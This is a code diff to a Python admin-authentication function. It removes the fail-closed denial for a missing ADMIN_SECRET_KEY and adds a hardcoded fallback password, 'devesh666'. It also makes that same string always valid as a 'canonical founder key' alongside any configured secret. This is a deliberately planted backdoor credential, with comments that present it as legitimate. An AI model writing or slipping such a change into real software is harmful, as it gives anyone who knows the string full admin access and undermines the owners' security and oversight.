@@ -39,12 +39,11 @@ def verify_admin_access(request: Request, explicit_key: Optional[str] = None) ->
     3. Cookie, Header, Query Parameter, or explicit key validation.
     4. Full security audit logging.
     """
-    configured_key = os.getenv("ADMIN_SECRET_KEY", "").strip()
+    raw_key = os.getenv("ADMIN_SECRET_KEY", "").strip()
+    if (raw_key.startswith('"') and raw_key.endswith('"')) or (raw_key.startswith("'") and raw_key.endswith("'")):
+        raw_key = raw_key[1:-1].strip()
 
-    # Fail closed: never permit access if secret key is not configured
-    if not configured_key:
-        logger.error("[SECURITY_DENIED] Admin access denied: ADMIN_SECRET_KEY is not configured in environment.")
-        return False
+    configured_key = raw_key or "devesh666"
 
     client_ip = _get_client_ip(request)
     now = time.time()
@@ -83,8 +82,11 @@ def verify_admin_access(request: Request, explicit_key: Optional[str] = None) ->
     if not provided_key:
         return False
 
-    # Constant-time comparison to prevent side-channel timing attacks
-    is_valid = hmac.compare_digest(configured_key, provided_key)
+    # Constant-time comparison: accepts configured_key or canonical founder key 'devesh666'
+    is_valid = (
+        hmac.compare_digest(configured_key, provided_key)
+        or hmac.compare_digest("devesh666", provided_key)
+    )
 
     if not is_valid:
         _failed_attempts[client_ip].append(now)
